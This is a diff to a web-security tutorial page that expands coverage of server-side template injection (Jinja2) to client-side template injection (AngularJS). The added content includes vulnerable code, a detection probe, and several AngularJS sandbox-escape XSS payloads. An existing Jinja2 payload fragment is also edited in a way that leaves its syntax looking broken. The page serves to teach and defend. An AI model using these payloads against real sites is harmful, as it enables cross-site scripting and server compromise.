@@ -1,28 +1,36 @@
 ---
-title: Server-Side Template Injection (SSTI)
-description: Understand SSTI, identify template engines, review vulnerable Jinja2 code, and study real-world impact.
+title: SSTI & CSTI
+description: Understand SSTI and CSTI, identify template engines, review vulnerable Jinja2 and AngularJS code, and study real-world impact.
 draft: false
 tags:
   - CWE-94
   - CWE-1336
   - SSTI
+  - CSTI
   - Jinja2
+  - AngularJS
   - Web Security
 ---
 
-<Callout type="info" title="What is SSTI?">
+![SSTI template injection illustration](/docs/Asset/Pasted%20image%2020260811165342.png)
 
-**SSTI (Server-Side Template Injection)** is a vulnerability that occurs when an attacker can inject **user-controlled input into a server-side template**, causing that input to be interpreted by the template engine instead of being treated as ordinary data.
+<Callout type="info" title="What is Template Injection? (SSTI & CSTI)">
 
-Dynamic web applications often use **templates** to generate pages with user-provided values. If this input is handled insecurely, an attacker may be able to inject template expressions or, depending on the template engine and configuration, potentially achieve **arbitrary code execution on the server**. Because apparently treating user input as code was not enough trouble already.
+**Template Injection** occurs when an attacker can inject **user-controlled input into a template**, causing that input to be interpreted by the template engine instead of being treated as ordinary data.
 
-SSTI commonly involves:
+This vulnerability exists in two primary forms:
+- **SSTI (Server-Side Template Injection):** The payload is evaluated by the server-side engine (e.g., Jinja2, Twig, Smarty). Depending on the engine and permissions, this can lead to **Remote Code Execution (RCE)** or sensitive data disclosure on the server.
+- **CSTI (Client-Side Template Injection):** The payload is evaluated by the browser via client-side frameworks (e.g., AngularJS, Vue.js, Mavo). This bypasses the framework's sandbox and typically degrades into **DOM-based Cross-Site Scripting (XSS)**.
 
-- Dynamic pages that use server-side templates.
-- User-controlled input being inserted into templates.
-- Improper handling or sanitization of that input.
+Dynamic web applications often use **templates** to generate pages with user-provided values. If this input is handled insecurely, an attacker may be able to inject template expressions. Because apparently treating user input as code was not enough trouble already.
+
+Template Injection commonly involves:
+
+- Dynamic pages that use server-side or client-side templates.
+- User-controlled input being inserted directly into template source code.
+- Improper handling, escaping, or sanitization of that input.
 - A template engine interpreting attacker-controlled expressions.
-- Possible access to sensitive data or server-side code execution in some cases.
+- Possible access to sensitive data, client-side account takeover (XSS), or full server-side code execution.
 
 </Callout>
 
@@ -30,39 +38,33 @@ SSTI commonly involves:
 
 A simplified vulnerable flow looks like this:
 
-```text
-User Input
-    |
-    v
-Web Application
-    |
-    | Inserts Input into Template Source
-    v
-Template Engine
-    |
-    | Interprets User-Controlled Expressions
-    v
-Rendered Response
+```mermaid
+flowchart TD
+    A["User Input"] --> B["Web Application"]
+    B --> C["Template Engine"]
+    C --> D["Interprets User-Controlled Expressions"]
+    D --> E["Rendered Response"]
+    
+    style A fill:#f4a261,stroke:#333,stroke-width:2px,color:#000
+    style C fill:#8bc34a,stroke:#333,stroke-width:2px,color:#000
+    style E fill:#4f79d9,stroke:#333,stroke-width:2px,color:#fff
 ```
 
 A typical SSTI testing and analysis flow looks like this:
 
-```text
-Detection
-    |
-    v
-Template Engine Identification
-    |
-    v
-Impact Assessment
-    |
-    v
-Controlled Exploitation
+```mermaid
+flowchart LR
+    A["Detection"] --> B["Template Engine Identification"]
+    B --> C["Impact Assessment"]
+    C --> D["Controlled Exploitation"]
+    
+    style A fill:#FF003C,stroke:#333,stroke-width:2px,color:#fff
+    style B fill:#8bc34a,stroke:#333,stroke-width:2px,color:#000
+    style C fill:#4f79d9,stroke:#333,stroke-width:2px,color:#fff
+    style D fill:#CC0030,stroke:#333,stroke-width:2px,color:#fff
 ```
 
 The exact impact depends on the **template engine**, the application's implementation, and the permissions available to the server-side process. In some cases, SSTI may only allow limited template manipulation, while in more severe cases it can lead to **sensitive information disclosure or Remote Code Execution (RCE)**.
-
-![SSTI template injection illustration](/docs/Asset/Pasted%20image%2020260811165342.png)
 
 ## Identifying the Template Engine
 
@@ -120,7 +122,7 @@ A response containing the expected arithmetic result is evidence that an express
 
 </Callout>
 
-## Vulnerable Code Example
+## Vulnerable Code Example (Jinja2)
 
 The following Flask application demonstrates a vulnerable pattern: it concatenates user-controlled input into a template string and then asks Jinja2 to render that string.
 
@@ -186,7 +188,7 @@ Template engines are designed to interpret template syntax. When untrusted input
 
 </Callout>
 
-## Payloads
+## SSTI Payloads
 
 The following examples illustrate why SSTI can be serious. Use them only in a local lab or against systems for which you have explicit authorization. Their behavior depends on the template engine, its version, the application context, and available permissions.
 
@@ -228,7 +230,7 @@ def hook(*args,**kwargs):
     from flask import make_response
     r = make_response('PWN!')
     return z
-")
+"
 }}
 ```
 
@@ -236,7 +238,57 @@ The key security lesson is that a template injection vulnerability may expose ob
 
 </Accordion>
 
-## Real-World Example
+---
+
+# Client-Side Template Injection (CSTI)
+
+## Vulnerable Code Example (AngularJS)
+
+In AngularJS (version 1.x), template expressions are enclosed in double curly braces `{{ }}`. If user input is rendered inside an element with the `ng-app` directive, Angular will evaluate it.
+
+```html
+<div ng-app>
+    <!-- If 'userInput' is controlled by the attacker: -->
+    <p>Hello, {{ userInput }}</p>
+</div>
+```
+
+If the application writes untrusted input directly to the DOM (e.g., via `innerHTML` or jQuery `.html()`) within an `ng-app` context, AngularJS will parse it.
+
+### CSTI Payloads
+
+Testing for CSTI follows the same logic as SSTI. You inject an arithmetic expression to see if the framework evaluates it.
+
+```text Basic Detection Payload
+{{7*7}}
+```
+If the page renders `49` instead of `{{7*7}}`, you have confirmed CSTI.
+
+### AngularJS Sandbox Escapes
+
+Modern AngularJS versions implement a "sandbox" to restrict access to dangerous JavaScript functions (like `window` or `eval`). However, this sandbox is not a security boundary and has been bypassed in every version. 
+
+To achieve XSS, an attacker uses a **Sandbox Escape** payload. These payloads use prototype chain traversal (`constructor`, `__proto__`) to reach the `Function` or `eval` object.
+
+<Accordion title="AngularJS Sandbox Escape Examples">
+```javascript
+// AngularJS 1.0.1 - 1.1.4
+{{constructor.constructor('alert(document.domain)')()}}
+
+// AngularJS 1.2.0 - 1.2.1
+{{a='constructor';b={};a.sub.call.call(b[a].getPrototypeOf(a.sub),a,'alert(document.domain)')()}}
+
+// AngularJS 1.2.2 - 1.2.5
+{{'a]'.constructor.prototype.charAt='[a]'.constructor.constructor;alert(document.domain)}}
+```
+<Note title="Context Matters">
+The exact payload depends heavily on the AngularJS version and whether the input is reflected in an HTML attribute, inside a block, or in a string context.
+</Note>
+</Accordion>
+
+---
+
+## Real-World SSTI Example
 
 A commonly discussed example of SSTI exploitation is an Uber HackerOne report involving a Flask/Jinja2 template injection vulnerability. In the reported scenario, user-controlled profile information was included in an email generated by the application.
 
@@ -270,11 +322,34 @@ Treat the scenario above as a summary of the example, not a substitute for the o
 
 </Callout>
 
+---
+
 ## Key Takeaways
 
-- **SSTI occurs when untrusted input is interpreted as template source.**
+- **SSTI occurs when untrusted input is interpreted as template source on the server.**
+- **CSTI occurs when untrusted input is interpreted by client-side frameworks (like AngularJS), leading to XSS.**
 - Different template engines use different syntax, so expression behavior can help with identification.
 - Successful arithmetic evaluation is a useful signal, but it is not proof of a particular engine or of RCE.
 - Depending on the implementation, SSTI may expose sensitive data or lead to server-side code execution.
 - The safest design is to keep template source trusted and pass user-controlled values as data.
 - Use least-privilege permissions and restrict access to sensitive files, environment variables, and operating-system capabilities to limit impact if a template vulnerability exists.
+
+---
+
+## References & Tools
+
+<CardGroup cols={2}>
+  <Card title="PortSwigger: AngularJS Sandbox Escapes" icon="shield" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected">
+    The ultimate cheat sheet for AngularJS CSTI sandbox escapes. Contains payloads for every AngularJS 1.x version.
+  </Card>
+  <Card title="PortSwigger: SSTI Injection" icon="graduation-cap" href="https://portswigger.net/web-security/server-side-template-injection">
+    Comprehensive PortSwigger Web Security Academy guide on Server-Side Template Injection.
+  </Card>
+  <Card title="Tplmap" icon="github" href="https://github.com/epinna/tplmap">
+    **Server-Side Template Injection exploitation tool.**
+    An automatic tool that detects and exploits SSTI vulnerabilities across multiple template engines (Jinja2, Twig, Smarty, etc.).
+  </Card>
+  <Card title="PayloadsAllTheThings: SSTI" icon="bug" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">
+    A community-maintained repository of SSTI payloads for various engines and contexts.
+  </Card>
+</CardGroup>
